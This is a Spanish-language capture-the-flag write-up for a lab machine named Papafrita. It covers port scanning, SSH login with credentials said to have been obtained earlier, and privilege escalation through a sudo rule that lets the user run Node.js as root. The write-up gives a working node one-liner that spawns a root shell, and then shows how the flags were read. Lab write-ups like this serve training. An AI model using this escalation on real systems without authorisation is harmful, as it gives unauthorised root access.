# Writeup: Operation Papafrita 🍟

Análisis táctico y cadena de explotación de la máquina objetivo **Papafrita** (IP: `192.168.0.7`). El vector de ataque documentado comprende un acceso inicial directo mediante credenciales previamente comprometidas y una escalada de privilegios vertical explotando la ejecución arbitraria de código mediante una mala configuración de Sudoers sobre el entorno de ejecución `Node.js` [GTFOBins alternative path].

---

## 🎯 Target Overview
* **Target IP:** `192.168.0.7`
* **OS:** Linux (Debian GNU/Linux 12 - Bookworm)
* **Architecture:** x86_64
* **Infrastructure:** Oracle VirtualBox hypervisor (`08:00:27:49:1E:2A`)

---

## ⚡ Phase 01: Reconnaissance & Port Scanning

Ejecución de un escaneo SYN Stealth de espectro completo (65,535 puertos TCP) con evasión de descubrimiento de host activa (`-Pn`).

```bash
# Full TCP Port Scanning
sudo nmap -Pn -sS -p- --min-rate 5000 192.168.0.7
```

### Open Ports Output
* **22/tcp** - `SSH` - OpenSSH 9.2p1 Debian 2+deb12u2
* **80/tcp** - `HTTP` - Apache httpd 2.4.57 (Debian Default Page)

### Deep Service Enumeration
```bash
nmap -sCV -p 22,80 192.168.0.7
```
El fingerprinting del sistema arroja un entorno Debian idéntico al objetivo previo, exponiendo un servidor web Apache por defecto sin vectores web aparentes en el puerto `80`. La atención operativa se redirige de inmediato al vector SSH.

---

## 🔑 Phase 02: Initial Access

Habiendo obtenido credenciales del usuario objetivo mediante técnicas previas de enumeración o exfiltración, se establece una sesión interactiva autenticada para el operador:

* **Identity:** `abuela`
* **Target Service:** SSH (`22/tcp`)

```bash
ssh abuela@192.168.0.7
```

Al acceder al entorno doméstico del usuario (`/home/abuela`), se detecta el archivo `user.txt`. No obstante, el usuario actual carece de privilegios de lectura básicos sobre su propio entorno para esta flag:
```bash
abuela@papafrita:~\$ cat user.txt
cat: user.txt: Permiso denegado
```
*Nota táctica: Esto confirma la necesidad imperativa de realizar un bypass de restricciones o escalada de privilegios inmediata para recolectar los artefactos.*

---

## 🚀 Phase 03: Privilege Escalation (From User to Root)

### Sudoers Inspection
Se realiza la auditoría de los permisos asignados en el entorno de ejecución segura para identificar vectores SUID/Sudo mal configurados:

```bash
abuela@papafrita:~\$ sudo -l
```
```log
Matching Defaults entries for abuela on papafrita:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User abuela may run the following commands on papafrita:
    (root) NOPASSWD: /usr/bin/node
```

El análisis revela que el entorno de ejecución **Node.js** (`/usr/bin/node`) puede ser invocado con los máximos privilegios del sistema (`root`) sin requerir contraseña (`NOPASSWD`).

### Exploitation Weapon: Node.js Command Execution Abuse
Node.js posee módulos nativos (`child_process`) diseñados para interactuar directamente con el sistema operativo subyacente. Al ser ejecutado bajo el contexto de `sudo`, hereda la capacidad de spawnear una shell hija con los privilegios del superusuario de manera interactiva.

Se inyecta la siguiente línea de ejecución de comandos inline (`-e`) conectando los flujos estándar de entrada, salida y error (`stdio: [0, 1, 2]`) a una nueva instancia de `/bin/sh`:

```bash
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

---

## 🏴 Phase 04: Post-Exploitation & Loot

La explotación otorga de manera inmediata una shell interactiva con el contexto de seguridad más elevado del sistema (`uid=0`).

```bash
# whoami
root

# cd /root
# ls
root.txt
```

### Flag Harvesting
Desde este nivel de acceso privilegiado, se procede a extraer de manera simultánea tanto el secreto del usuario restringido como la flag del administrador global del sistema:

```bash
# Extraer flag del usuario abuela
cat /home/abuela/user.txt

# Extraer flag del usuario root
cat /root/root.txt
```

**System Fully Compromised. Zero Restraints Remaining.** 💀
